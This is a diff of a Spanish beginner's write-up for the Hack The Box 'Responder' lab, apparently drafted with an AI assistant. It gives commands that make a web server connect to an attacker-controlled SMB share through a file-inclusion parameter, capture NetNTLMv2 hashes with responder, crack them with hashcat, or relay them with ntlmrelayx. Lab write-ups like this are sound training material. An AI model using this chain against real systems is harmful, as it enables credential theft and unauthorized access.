@@ -1,20 +1,22 @@
 ---
-title: "Responder (Writeup simple para DUMMIES)"
-description: "Responder (Writeup simple para DUMMIES)"
-date: "2026-03-19"
+title: 'Responder (Writeup simple para DUMMIES)'
+description: 'Responder (Writeup simple para DUMMIES)'
+date: '2026-03-19'
 tags:
   - writeup
   - learning
   - simple
-tools:
-  []
+tools: []
 ---
+
 Responder (Writeup simple para DUMMIES)
 
 Objetivo
+
 - Forzar al servidor objetivo a autenticarse contra tu máquina para capturar un hash NTLM o para reenviar (relay) esa autenticación hacia otro servicio.
 
 Resumen paso a paso (idea simple)
+
 1. Te conectas a HTB por VPN (OpenVPN) → tu máquina tiene una interfaz `tun0` con una IP de la VPN (ej.: `10.10.17.188`).
 2. Ejecutas `responder` escuchando en `tun0`. Esto hace que esperes conexiones de autenticación NTLM.
 3. Haces que el servidor objetivo intente abrir una ruta de red hacia tu IP (UNC/SMB): `\\10.10.17.188\Share` (en algunas apps se intenta con `//10.10.17.188/Share`).
@@ -22,7 +24,9 @@ Resumen paso a paso (idea simple)
 5. Opciones: crackear el hash (poco práctico) o RELAY la autenticación a otro servicio (SMB/WinRM) con `ntlmrelayx.py`.
 
 Comandos básicos (cópialos y pégalos)
+
 - Ver tu IP en la VPN:
+
 ```bash
 ip a | grep tun0
 # salida esperada ejemplo:
@@ -30,34 +34,44 @@ ip a | grep tun0
 ```
 
 - Iniciar Responder en `tun0`:
+
 ```bash
 sudo responder -I tun0 -wrf
 ```
 
 - Forzar el intento de conexión SMB desde la web (ejemplo con Host y target real):
+
 ```bash
 curl -s -H "Host: unika.htb" "http://10.129.95.234/index.php?page=//10.10.17.188/ShareFileHTB"
 ```
+
 Notas:
+
 - Dependiendo de cómo la web procese `page`, puede que necesites `\\\\10.10.17.188\\Share` (doble escape) o variantes. Prueba 3 formatos: `//IP/Share`, `\\IP\Share` y `\\\\IP\\Share`.
 
 - Ver logs en tiempo real:
+
 ```bash
 tail -f Logs/Responder-*/Responder-Session.log
 ```
 
 Qué buscar en los logs
+
 - Líneas con `NTLMv2-SSP` o `NETNTLMv2`.
 - Un hash NetNTLMv2 suele verse parecido a:
   username::DOMAIN:challenge:response:data
 - Guarda esa línea en un fichero `netntlm_hashes.txt` si aparece.
 
 Qué hacer cuando tienes el hash
+
 - Intento de cracking (puede durar mucho y fallar):
+
 ```bash
 hashcat -m 5600 netntlm_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
+
 - Intento de relay (más práctico): apunta `ntlmrelayx.py` al servicio que quieras atacar:
+
 ```bash
 # Relay a SMB
 sudo ntlmrelayx.py -t smb://10.129.95.234 -smb2support
@@ -66,12 +80,14 @@ sudo ntlmrelayx.py -t http://10.129.95.234 --delegate-access
 ```
 
 Notas importantes (para que lo entiendas sencillo)
+
 - `tun0` es tu "puerta" dentro de HTB. Si el objetivo puede llegar a tu `tun0` IP, la autenticación llegará a ti.
 - El nombre del "share" puede ser cualquiera; lo importante es que el servidor intente conectar por SMB a tu IP.
 - Capturar un NetNTLM no te da automáticamente una contraseña usable en texto; puedes intentar romperla, o usar RELAY para aprovechar la autenticación sin conocer la contraseña.
 - Raro pero posible: si el objetivo no puede alcanzar tu IP (firewall, rutas), no verás nada.
 
 Siguiente paso recomendado
+
 - Poner `responder` en `tun0`, intentar los 3 formatos de UNC con `curl` y observar los logs. Si capturas un hash, sube aquí la línea (siempre en laboratorio) y puedo guiarte para relay o cracking.
 
 Si quieres, integro estos comandos y salidas esperadas dentro de `writeups/learning/Responder_WRITEUP.md` existente (con capturas de ejemplo). ¿Lo hago?
